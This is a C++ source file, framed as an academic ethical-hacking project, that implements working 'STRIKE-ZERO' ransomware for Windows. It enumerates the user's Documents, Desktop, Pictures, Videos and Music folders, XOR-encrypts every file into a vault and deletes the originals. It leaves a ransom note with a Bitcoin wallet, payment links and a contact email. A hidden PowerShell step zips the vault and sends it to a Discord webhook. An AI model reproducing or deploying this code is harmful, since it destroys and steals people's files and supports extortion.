// ============================================================
//  ransomware_terminal.cpp — Fake ransomware "terminal hacker"
//  Proyecto académico - Hacking ético - UPC
// ============================================================
#include "ransomware_terminal.h"
#include "discord.h"
#include "config.h"
#include "contadores.h"
#include "graffiti.h"
#include "mercadopago.h"
#include <windows.h>
#include <shellapi.h>          
#include <shlobj.h>

#include <string>
#include <sstream>
#include <thread>
#include <chrono>
#include <vector>
#include <fstream>
#include <iostream>
#include <conio.h>
#include <thread>
#include <chrono>

#pragma comment(lib, "shell32.lib")

// ============================================================
//  CONFIGURACIÓN
// ============================================================
#define EXTENSION_FAKE      L".strike"
#define WALLET_BTC          L"15ZxyXY94MqpRRWqbUKaz6ZnE5QjGGS8TC"
#define BINANCE_URL         L"https://accounts.binance.com/es-LA/login"
#define EMAIL_RESCATE       L"decrypt@strike-zero-recovery.onion"
#define PRECIO_RESCATE      L"0.015 BTC (~ $450 USD)"
#define CLAVE_XOR           0x5A

// ============================================================
//  Colores ANSI
// ============================================================
#define C_RED     "\x1b[91m"
#define C_GREEN   "\x1b[92m"
#define C_YELLOW  "\x1b[93m"
#define C_BLUE    "\x1b[94m"
#define C_MAGENTA "\x1b[95m"
#define C_CYAN    "\x1b[96m"
#define C_WHITE   "\x1b[97m"
#define C_GRAY    "\x1b[90m"
#define C_RESET   "\x1b[0m"
#define C_BOLD    "\x1b[1m"
#define C_DIM     "\x1b[2m"
#define C_BLINK   "\x1b[5m"


// ============================================================
//  Configurar consola
// ============================================================
static void HabilitarANSI() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
    SetConsoleOutputCP(437);
    SetConsoleCP(437);
}

static void SetFuenteConsola() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_FONT_INFOEX cfi;
    cfi.cbSize = sizeof(cfi);
    cfi.nFont = 0;
    cfi.dwFontSize.X = 8;
    cfi.dwFontSize.Y = 12;
    cfi.FontFamily = FF_DONTCARE;
    cfi.FontWeight = FW_NORMAL;
    wcscpy_s(cfi.FaceName, L"Terminal");
    SetCurrentConsoleFontEx(hOut, FALSE, &cfi);
}

static void SetTamanoConsola() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT ventana = {0, 0, 119, 39};
    COORD buffer = {120, 1000};
    SetConsoleScreenBufferSize(hOut, buffer);
    SetConsoleWindowInfo(hOut, TRUE, &ventana);
}

// ============================================================
//  Escribir lento
// ============================================================
static void EscribirLento(const std::string& texto, int delay_ms = 15) {
    for (char c : texto) {
        std::cout << c << std::flush;
        Sleep(delay_ms);
    }
}

// ============================================================
//  INTRO VISUAL CREEPY
// ============================================================
static void AnimacionIntro() {
    std::cout << "\n\n";

    std::cout << C_RED << C_BOLD;
    std::cout << R"(
                       :::!~!!!!!:.
                   .xUHWH!! !!?M88WHX:.
                 .X*#M@$!!  !X!M$$$$$$WWx:.
                :!!!!!!?H! :!$!$$$$$$$$$$8X:
               !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
              :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
              ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
                !:~~~ .:!M"T#$$$$WX??#MRRMMM!
                ~?WuxiW*`   `"#$$$$8!!!!??!!!
              :X- M$$$$    *    `"T#$T~!8$WUXU~
             :%`  ~#$$$m:        ~!~ ?$$$$$$
           :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$     *   /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
    )" << "\n";

    std::cout << C_RED << C_BOLD;
    std::cout << R"(
   #####  #####  #####  #####  #   #  #####     #####  #####  #   #  #####
   #      #        #    #      ##  #  #         #   #  #      ##  #  #
   #####  #####    #    #####  # # #  #####     #   #  #####  # # #  #####
       #      #    #    #      #  ##  #         #   #  #      #  ##      #
   #####  #####    #    #####  #   #  #####     #####  #####  #   #  #####
    )" << "\n";

    std::cout << C_RED << C_BOLD;
    std::cout << R"(
    ####    ###   #    #  ####  #    #  ####    ###   #    #
    #   #  #   #  ##   #  #     ##  ##  #   #  #   #  ##   #
    ####   #####  # #  #  ####  # # # #  ####   #####  # #  #
    # #    #   #  #  ##      #  #  ## #  # #    #   #  #  ##
    #  #   #   #  #    #  ####  #    #  ####   #   #  #    #
    )" << "\n";

    std::cout << C_RESET << "\n";

    std::cout << C_RED << C_BLINK << C_BOLD;
    std::cout << "                  [>] STRIKE-ZERO RANSOMWARE [<]\n";
    std::cout << C_RESET << "\n";

    Sleep(3000);
}

// ============================================================
//  ANIMACIÓN DE SCANNING
// ============================================================
static void AnimacionScanning() {
    std::cout << "\n\n\n";

    std::cout << C_GREEN << C_BOLD;
    EscribirLento("  [*] Inicializando STRIKE-ZERO...\n", 15);
    Sleep(400);

    std::cout << C_GREEN;
    EscribirLento("  [*] Estableciendo conexion con el C2...  ", 15);
    Sleep(300);
    std::cout << C_GREEN << "[OK]" << C_RESET << "\n";
    Sleep(300);

    EscribirLento("  [*] Escaneando sistema objetivo...  ", 15);
    Sleep(200);
    std::cout << C_GREEN << "[OK]" << C_RESET << "\n";
    Sleep(300);

    EscribirLento("  [*] Enumerando carpetas de usuario...  ", 15);
    Sleep(200);
    std::cout << C_GREEN << "[OK]" << C_RESET << "\n";
    Sleep(300);

    EscribirLento("  [*] Cargando modulo AES-256...  ", 15);
    Sleep(200);
    std::cout << C_GREEN << "[OK]" << C_RESET << "\n";
    Sleep(300);

    EscribirLento("  [*] Preparando cifrado RSA-4096...  ", 15);
    Sleep(200);
    std::cout << C_GREEN << "[OK]" << C_RESET << "\n";
    Sleep(500);

    std::cout << "\n";
    std::cout << C_YELLOW << C_BOLD;
    EscribirLento("  [!] INICIANDO ATAQUE EN 3 SEGUNDOS...", 40);
    std::cout << C_RESET << "\n";
    Sleep(1000);
    std::cout << C_RED << C_BOLD << "  3... " << C_RESET << std::flush;
    Sleep(1000);
    std::cout << C_RED << C_BOLD << "2... " << C_RESET << std::flush;
    Sleep(1000);
    std::cout << C_RED << C_BOLD << "1... " << C_RESET << std::flush;
    Sleep(1000);
    std::cout << C_RED << C_BOLD << "GO!" << C_RESET << "\n\n";
    Sleep(500);
}

// ============================================================
//  CALAVERA GRANDE
// ============================================================
static void MostrarCalavera() {
    std::cout << C_RED;

    std::cout << R"(
                                  ___ _.-.,,._-___
                             .o888888888888888P'
                          .d88888888888888888K
          ,8            888888888888888888888boo._
         :88b           888888888888888888888888888b.
          `Y8b          88888888888888888888888888888b.
            `Yb.       d8888888888888888888888888888888b
              `Yb.___.88888888888888888888888888888888888b
                `Y888888888888888888888888888888CG888888P"'
                  `88888888888888888888888888888MM88P"'
  .d8888b.    ""Y888888888888888888888888oo._""""
 d88P  Y88b      8888`Y88888888888888888888oo.
 Y88b.           8888 ,8888888888888888888888888o,
  "Y888b.        8888""Y8`Y8888888888888888888888b.
     "Y88b.      8888   Y  `Y8888888888888888888888
 Y88b  d88P      8888     .d `Y8888888888888888888888b
  "Y8888P"     .d8888b..d88P   `Y88888888888888888888
                                 `Y88888888888888888888b.
                 "Y888P""Y8b. "Y8888888888888888888888
                   888    888   Y888`Y888888888888888
                   888   d88P    Y88b `Y8888888888888
                   888"Y88K"      Y88b dPY8888888888P
                   888  Y88b       Y88dP  `Y88888888b
                   888   Y88b       Y8P     `Y8888888
                 .d888b.  Y88b.      Y        `Y88888
                                               `Y88K
                                                 `Y8
                                                   '
    )" << "\n";

    std::cout << C_RESET << "\n";
}

// ============================================================
//  Barra de progreso
// ============================================================
static void BarraProgreso(int porcentaje, const std::string& archivo) {
    int llenos = porcentaje / 2;
    int vacios = 50 - llenos;

    std::cout << "\r" << C_WHITE << "[" << C_RESET;
    std::cout << C_GREEN << C_BOLD;
    for (int i = 0; i < llenos; i++) std::cout << "=";
    std::cout << C_RESET << C_RED << ">";
    for (int i = 0; i < vacios - 1; i++) std::cout << " ";
    std::cout << C_WHITE << "] " << C_RESET;
    std::cout << C_YELLOW << C_BOLD << porcentaje << "%" << C_RESET;

    std::string nombre_corto = archivo.substr(0, 25);
    std::cout << C_CYAN << " | " << nombre_corto << C_RESET;
    std::cout << "                            ";

    std::cout.flush();
}

// ============================================================
//  Generar ID víctima
// ============================================================
static std::wstring GenerarIDVictima() {
    wchar_t hostname[256]; DWORD size = 256;
    GetComputerNameW(hostname, &size);

    wchar_t usuario[256]; size = 256;
    GetUserNameW(usuario, &size);

    std::wstring seed = std::wstring(hostname) + L"_" + usuario;
    unsigned long hash = 5381;
    for (wchar_t c : seed) {
        hash = ((hash << 5) + hash) + (unsigned long)c;
    }

    wchar_t id[32];
    swprintf_s(id, L"%08X%08X", (unsigned int)GetTickCount(), (unsigned int)hash);
    return std::wstring(id);
}

// ============================================================
//  Cifrar archivo
// ============================================================
static bool CifrarArchivo(const std::wstring& origen, const std::wstring& destino) {
    std::string origen_utf8  = WideToUtf8(origen);
    std::string destino_utf8 = WideToUtf8(destino);

    std::ifstream in(origen_utf8.c_str(), std::ios::binary);
    if (!in) return false;

    std::ofstream out(destino_utf8.c_str(), std::ios::binary);
    if (!out) { in.close(); return false; }

    char buffer[8192];
    while (in.read(buffer, sizeof(buffer)) || in.gcount() > 0) {
        std::streamsize leidos = in.gcount();
        for (std::streamsize i = 0; i < leidos; i++) {
            buffer[i] ^= CLAVE_XOR;
        }
        out.write(buffer, leidos);
    }

    in.close();
    out.close();

    DeleteFileW(origen.c_str());
    return true;
}

// ============================================================
//  Listar archivos
// ============================================================
static std::vector<std::wstring> ListarArchivos(const std::wstring& carpeta) {
    std::vector<std::wstring> resultado;
    std::wstring patron = carpeta + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(patron.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return resultado;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        std::wstring nombre = fd.cFileName;
        if (nombre.find(L"LEEME_RESCATE") != std::wstring::npos) continue;

        resultado.push_back(carpeta + L"\\" + fd.cFileName);
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return resultado;
}

// ============================================================
//  ANIMACIÓN DE CIFRADO
// ============================================================
static int AnimacionCifrado(const std::wstring& id_victima) {
    wchar_t userPath[MAX_PATH];
    std::vector<std::wstring> carpetas;

    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, userPath)))
        carpetas.push_back(userPath);
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, userPath)))
        carpetas.push_back(userPath);
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYPICTURES, NULL, 0, userPath)))
        carpetas.push_back(userPath);
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, 0, userPath)))
        carpetas.push_back(userPath);
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYMUSIC, NULL, 0, userPath)))
        carpetas.push_back(userPath);

    std::vector<std::wstring> todos;
    for (auto& carpeta : carpetas) {
        auto archivos = ListarArchivos(carpeta);
        todos.insert(todos.end(), archivos.begin(), archivos.end());
    }

    int total = (int)todos.size();
    if (total == 0) total = 1;

    MostrarCalavera();

    std::cout << "\n";
    std::cout << C_RED << C_BOLD;
    std::cout << "  ================================================================\n";
    std::cout << C_RESET;
    std::cout << C_WHITE << C_BOLD;
    std::cout << "                    ENCRYPTION ENGINE v2.0\n";
    std::cout << C_RESET;
    std::cout << C_RED << C_BOLD;
    std::cout << "  ================================================================\n";
    std::cout << C_RESET << "\n";

    std::cout << C_GRAY << "  Target ID:    " << C_GREEN << C_BOLD
              << WideToUtf8(id_victima) << C_RESET << "\n";
    std::cout << C_GRAY << "  Host:         " << C_WHITE
              << "TARGET-SYSTEM" << C_RESET << "\n";
    std::cout << C_GRAY << "  Files found:  " << C_YELLOW << C_BOLD
              << total << C_RESET << "\n";
    std::cout << C_GRAY << "  Status:       " << C_RED << C_BOLD
              << "ENCRYPTING..." << C_RESET << "\n\n";

    Sleep(800);

    std::cout << C_YELLOW << "  [*] " << C_RESET
              << "Initializing encryption engine...\n";
    Sleep(400);
    std::cout << C_YELLOW << "  [*] " << C_RESET
              << "Generating AES-256 keys...\n";
    Sleep(400);
    std::cout << C_YELLOW << "  [*] " << C_RESET
              << "RSA-4096 handshake... " << C_GREEN << C_BOLD
              << "OK" << C_RESET << "\n";
    Sleep(400);
    std::cout << C_YELLOW << "  [*] " << C_RESET
              << "Disabling recovery services...\n";
    Sleep(400);
    std::cout << C_GREEN << C_BOLD << "  [+] " << C_RESET
              << "Encryption keys ready.\n\n";
    Sleep(600);

    std::cout << C_WHITE << "  ----------------------------------------------------------------\n";
    std::cout << C_RESET;

    int contador = 0;
    int exitosos = 0;

    for (auto& archivo : todos) {
        contador++;
        int porcentaje = (contador * 100) / total;

        std::wstring nombre_w = archivo.substr(archivo.find_last_of(L"\\") + 1);
        std::string nombre_utf8 = WideToUtf8(nombre_w);

        BarraProgreso(porcentaje, nombre_utf8);
        Sleep(40);

        std::wstring destino = std::wstring(VAULT_PATH) + L"\\" +
                               nombre_w + EXTENSION_FAKE;

        if (CifrarArchivo(archivo, destino)) {
            exitosos++;
        }
    }

    std::cout << "\n";
    std::cout << C_WHITE << "  ----------------------------------------------------------------\n\n";
    std::cout << C_RESET;

    std::cout << C_GREEN << C_BOLD;
    std::cout << "  [+] " << exitosos << " / " << total
              << " files encrypted successfully.\n";
    std::cout << C_RED;
    std::cout << "  [+] Originals deleted.\n";
    std::cout << C_RESET << "\n";
    Sleep(1000);

    return exitosos;
}

// ============================================================
//  PANTALLA DE PAGO
// ============================================================
// ============================================================
//  PANTALLA DE PAGO (con bucle para volver al menú)
// ============================================================
static void MostrarPantallaPago(const std::wstring& id_victima, int total) {
    Sleep(1200);

    bool salir = false;

    while (!salir) {
        system("cls");
        MostrarCalavera();

        std::cout << "\n";
        std::cout << C_RED << C_BOLD << C_BLINK;
        std::cout << "          ### ALL YOUR FILES HAVE BEEN ENCRYPTED ###\n";
        std::cout << C_RESET << "\n";

        std::cout << C_WHITE << "  Victim ID:     " << C_GREEN << C_BOLD
                  << WideToUtf8(id_victima) << C_RESET << "\n";
        std::cout << C_WHITE << "  Files locked:  " << C_YELLOW << C_BOLD
                  << total << C_RESET << "\n";
        std::cout << C_WHITE << "  Extension:     " << C_RED
                  << ".strike" << C_RESET << "\n";
        std::cout << C_WHITE << "  Algorithm:     " << C_WHITE
                  << "AES-256 + RSA-4096\n";
        std::cout << C_WHITE << "  Deadline:      " << C_RED << C_BOLD
                  << "72 HOURS" << C_RESET << "\n";
        std::cout << "\n";

        std::cout << C_RED << C_BOLD;
        std::cout << "  +==============================================================+\n";
        std::cout << "  |                                                              |\n";
        std::cout << "  |               SELECT PAYMENT METHOD                          |\n";
        std::cout << "  |                                                              |\n";
        std::cout << "  +==============================================================+\n";
        std::cout << C_RESET << "\n";

        std::cout << C_CYAN << C_BOLD << "  [1]" << C_RESET
                  << " " << C_WHITE << "Bitcoin (BTC)         --  " << C_YELLOW
                  << WideToUtf8(PRECIO_RESCATE) << C_RESET << "\n";

        std::cout << C_CYAN << C_BOLD << "  [2]" << C_RESET
                  << " " << C_WHITE << "Mercado Pago          --  " << C_YELLOW
                  << "$860 USD" << C_RESET << "\n";

        std::cout << C_CYAN << C_BOLD << "  [3]" << C_RESET
                  << " " << C_WHITE << "Yape / Plin           --  " << C_YELLOW
                  << "S/ 1,700 PEN" << C_RESET << "\n";

        std::cout << C_CYAN << C_BOLD << "  [4]" << C_RESET
                  << " " << C_WHITE << "Contact Support" << C_RESET << "\n";

        std::cout << C_CYAN << C_BOLD << "  [0]" << C_RESET
                  << " " << C_WHITE << "Exit" << C_RESET << "\n";

        std::cout << "\n";
        std::cout << C_GRAY << "  Select an option [0-4]: " << C_RESET;

        std::string opcion;
        std::getline(std::cin, opcion);
        if (opcion.empty()) opcion = "1";

        std::cout << "\n";

        if (opcion == "1") {
            system("cls");
            MostrarCalavera();

            std::cout << "\n";
            std::cout << C_YELLOW << C_BOLD
                      << "  ### BITCOIN PAYMENT ###\n\n" << C_RESET;

            std::cout << C_WHITE << "  Amount:  " << C_YELLOW << C_BOLD
                      << WideToUtf8(PRECIO_RESCATE) << C_RESET << "\n\n";

            std::cout << C_WHITE << "  Step 1: Buy BTC at:\n" << C_RESET;
            std::cout << C_CYAN << "    " << WideToUtf8(BINANCE_URL) << C_RESET << "\n\n";

            std::cout << C_WHITE << "  Step 2: Send to wallet:\n" << C_RESET;
            std::cout << C_GREEN << C_BOLD << "    "
                      << WideToUtf8(WALLET_BTC) << C_RESET << "\n\n";

            std::cout << C_WHITE << "  Step 3: Send payment proof to:\n" << C_RESET;
            std::cout << C_MAGENTA << "    "
                      << WideToUtf8(EMAIL_RESCATE) << C_RESET << "\n\n";

            std::cout << C_CYAN << "  [*] Abriendo Binance en el navegador...\n" << C_RESET;
            ShellExecuteW(NULL, L"open", BINANCE_URL, NULL, NULL, SW_SHOWNORMAL);
            Sleep(2000);

            std::cout << "\n";
            std::cout << C_WHITE << "  Presiona ENTER para volver al menu...\n" << C_RESET;
            std::cin.get();
        }
         else if (opcion == "2") {
        system("cls");
        MostrarCalavera();

        std::cout << "\n";
        std::cout << C_YELLOW << C_BOLD
                  << "  ### MERCADO PAGO PORTAL ###\n\n" << C_RESET;

        std::cout << C_WHITE << "  Amount:  " << C_YELLOW << C_BOLD
                  << "$870 USD" << C_RESET << "\n\n";

        std::cout << C_WHITE << "  Item:    " << C_CYAN
                  << "Rescate STRIKE-ZERO" << C_RESET << "\n\n";

        std::cout << C_CYAN << "  [*] Abriendo Mercado Pago en el navegador...\n\n" << C_RESET;

        std::wstring linkPago = L"https://mpago.la/12s2hCs";

        ShellExecuteW(NULL, L"open", linkPago.c_str(), NULL, NULL, SW_SHOWNORMAL);
        Sleep(2500);

        std::cout << C_GREEN << "  [OK] Navegador abierto.\n" << C_RESET;
        std::cout << C_WHITE << "  Completa el pago en la pagina de Mercado Pago.\n\n" << C_RESET;

        std::cout << C_WHITE << "  Presiona ENTER para volver al menu...\n" << C_RESET;
        std::cin.get();
    }
        else if (opcion == "3") {
            system("cls");
            MostrarCalavera();

            std::cout << "\n";
            std::cout << C_YELLOW << C_BOLD
                      << "  ### YAPE / PLIN PAYMENT ###\n\n" << C_RESET;

            std::cout << C_WHITE << "  Amount:  " << C_YELLOW << C_BOLD
                      << "S/ 1,700 PEN\n\n" << C_RESET;

            std::cout << C_WHITE << "  Scan this QR with your Yape app:\n\n" << C_RESET;

            std::cout << C_WHITE << C_BOLD;
            std::cout << "      ################################\n";
            std::cout << "      ##  ##  ##  ##  ##  ##  ##  ##\n";
            std::cout << "      ##  ##  ##  ##  ##  ##  ##  ##\n";
            std::cout << "      ################################\n";
            std::cout << "      ##  ##  ##  ##  ##  ##  ##  ##\n";
            std::cout << "      ##  ##  ##  ##  ##  ##  ##  ##\n";
            std::cout << "      ################################\n";
            std::cout << "      ##  ##  ##  ##  ##  ##  ##  ##\n";
            std::cout << "      ##  ##  ##  ##  ##  ##  ##  ##\n";
            std::cout << "      ################################\n";
            std::cout << C_RESET << "\n";

            std::cout << C_WHITE
                      << "  After payment, send the receipt to:\n" << C_RESET;
            std::cout << C_MAGENTA << "    "
                      << WideToUtf8(EMAIL_RESCATE) << C_RESET << "\n\n";

            std::cout << C_WHITE << "  Presiona ENTER para volver al menu...\n" << C_RESET;
            std::cin.get();
        }
        else if (opcion == "4") {
            system("cls");
            MostrarCalavera();

            std::cout << "\n";
            std::cout << C_CYAN << C_BOLD
                      << "  ### SUPPORT CONTACT ###\n\n" << C_RESET;

            std::cout << C_WHITE << "  Email:     " << C_MAGENTA
                      << WideToUtf8(EMAIL_RESCATE) << C_RESET << "\n";
            std::cout << C_WHITE << "  Victim ID: " << C_GREEN << C_BOLD
                      << WideToUtf8(id_victima) << C_RESET << "\n";
            std::cout << C_WHITE << "  Response:  " << C_YELLOW
                      << "Within 24 hours\n" << C_RESET << "\n";

            std::cout << C_WHITE << "  Presiona ENTER para volver al menu...\n" << C_RESET;
            std::cin.get();
        }
        else if (opcion == "0") {
            salir = true;
        }
        else {
            std::cout << C_RED << "  Opcion invalida.\n" << C_RESET;
            Sleep(1500);
        }
    }

}

// ============================================================
//  Nota de rescate
// ============================================================
static void DejarNota(const std::wstring& id_victima) {
    wchar_t userPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, userPath)))
        return;

    std::wstring nota = std::wstring(userPath) + L"\\LEEME_RESCATE.txt";

    std::wstringstream ss;
    ss << L"========================================================\r\n"
       << L"        STRIKE-ZERO RANSOMWARE - LOCKED\r\n"
       << L"========================================================\r\n"
       << L"\r\n"
       << L"TODOS TUS ARCHIVOS HAN SIDO CIFRADOS.\r\n"
       << L"\r\n"
       << L"ID de victima:  " << id_victima << L"\r\n"
       << L"Extension:      " << EXTENSION_FAKE << L"\r\n"
       << L"\r\n"
       << L"========================================================\r\n"
       << L"  METODOS DE PAGO\r\n"
       << L"========================================================\r\n"
       << L"\r\n"
       << L"1. Bitcoin:  " << PRECIO_RESCATE << L"\r\n"
       << L"   Compra en: " << BINANCE_URL << L"\r\n"
       << L"   Wallet: " << WALLET_BTC << L"\r\n"
       << L"\r\n"
       << L"2. Contacta a: " << EMAIL_RESCATE << L"\r\n"
       << L"\r\n"
       << L"Tienes 72 horas antes de que el precio se duplique.\r\n"
       << L"\r\n"
       << L"========================================================\r\n"
       << L"  LCorg proyect - UPC\r\n"
       << L"========================================================\r\n";

    HANDLE hFile = CreateFileW(nota.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        std::string utf8 = WideToUtf8(ss.str());
        DWORD written;
        WriteFile(hFile, utf8.c_str(), (DWORD)utf8.size(), &written, NULL);
        CloseHandle(hFile);
    }
}

// ============================================================
//  Aviso Discord
// ============================================================
static void AvisoDiscord(const std::wstring& id_victima, int total) {
    std::wstringstream ss;
    ss << L"STRIKE-ZERO RANSOMWARE\n"
       << L"------------------------------\n"
       << L"ID Victima: `" << id_victima << L"`\n"
       << L"Archivos cifrados: `" << total << L"`\n"
       << L"Extension: `.strike`\n"
       << L"Rescate: `" << PRECIO_RESCATE << L"`\n"
       << L"Wallet: `" << WALLET_BTC << L"`\n"
       << L"Binance: " << BINANCE_URL << L"\n"
       << L"Contacto: `" << EMAIL_RESCATE << L"`\n"
       << L"------------------------------\n";

    DiscordEnviarTexto(WEBHOOK_ALERTAS, ss.str());
}

// ============================================================
//  Exfiltrar vault
// ============================================================
// ============================================================
//  Exfiltrar vault (versión mejorada con PowerShell)
// ============================================================
static void ExfiltrarVault() {
    wchar_t patron[MAX_PATH];
    swprintf_s(patron, L"%s\\*", VAULT_PATH);
    
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(patron, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        DiscordEnviarTexto(WEBHOOK_ALERTAS, L"❌ Vault no existe");
        return;
    }
    
    int numArchivos = 0;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        numArchivos++;
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    if (numArchivos == 0) {
        DiscordEnviarTexto(WEBHOOK_ALERTAS, L"❌ Vault vacía");
        return;
    }

    DiscordEnviarTexto(WEBHOOK_ALERTAS,
        L"📦 Comprimiendo `" + std::to_wstring(numArchivos) + L"` archivos...");

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);

    std::wstringstream ss;
    ss << tempPath << L"exfil_" << GetTickCount() << L".zip";
    std::wstring ruta_zip = ss.str();

    // Intentar con PowerShell primero
    std::wstringstream cmd;
    cmd << L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""
        << L"Compress-Archive -Path '" << VAULT_PATH << L"\\*' -DestinationPath '"
        << ruta_zip << L"' -Force\"";

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    std::wstring cmd_copy = cmd.str();

    BOOL ok = CreateProcessW(NULL, (LPWSTR)cmd_copy.c_str(),
        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (ok) {
        WaitForSingleObject(pi.hProcess, 40000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExW(ruta_zip.c_str(), GetFileExInfoStandard, &fad)) {
        DiscordEnviarTexto(WEBHOOK_ALERTAS, L"❌ PowerShell no creó el ZIP");
        return;
    }

    LARGE_INTEGER size;
    size.LowPart = fad.nFileSizeLow;
    size.HighPart = fad.nFileSizeHigh;
    long long bytes = size.QuadPart;

    if (bytes > 8 * 1024 * 1024) {
        DiscordEnviarTexto(WEBHOOK_ALERTAS,
            L"⚠️ ZIP muy grande: " + std::to_wstring(bytes / 1024 / 1024) + L" MB");
        DeleteFileW(ruta_zip.c_str());
        return;
    }

    std::wstring comentario = L"📦 Exfiltración (" +
        std::to_wstring(numArchivos) + L" archivos, " +
        std::to_wstring(bytes / 1024) + L" KB)";

    bool enviado = DiscordEnviarArchivo(WEBHOOK_EXFILTRACION, ruta_zip, comentario);

    if (enviado) {
        DiscordEnviarTexto(WEBHOOK_ALERTAS, L"✅ ZIP enviado");
    } else {
        DiscordEnviarTexto(WEBHOOK_ALERTAS, L"❌ Discord rechazó el ZIP");
    }

    DeleteFileW(ruta_zip.c_str());
}

// ============================================================
//  HILO PRINCIPAL
// ============================================================
// ============================================================
//  HILO PRINCIPAL
// ============================================================
void HiloRansomwareTerminal() {
    std::this_thread::sleep_for(std::chrono::milliseconds(TIEMPO_RANSOMWARE_MS));

    AllocConsole();
    freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
    freopen_s((FILE**)stdin,  "CONIN$",  "r", stdin);

    SetConsoleTitleW(L"STRIKE-ZERO RANSOMWARE v2.0");
    HabilitarANSI();
    SetFuenteConsola();
    SetTamanoConsola();

    // 1. Intro visual creepy
    AnimacionIntro();

    // 2. Animación de "scanning"
    AnimacionScanning();

    // 3. Generar ID
    std::wstring id_victima = GenerarIDVictima();

    // 4. Crear vault
    CreateDirectoryW(VAULT_PATH, NULL);

    // 5. Animación de cifrado
    int total = AnimacionCifrado(id_victima);
    g_archivos_totales = total;

    // 6. Dejar nota + avisar Discord
    DejarNota(id_victima);
    AvisoDiscord(id_victima, total);
    CambiarFondoPantalla();

    // ⭐ 7. EXFILTRAR EN PARALELO (no bloquea)
    std::thread([](){
        ExfiltrarVault();
    }).detach();

    // 8. Mostrar pantalla de pago (mientras se exfiltra en background)
    MostrarPantallaPago(id_victima, total);

    Sleep(3000);
    FreeConsole();
}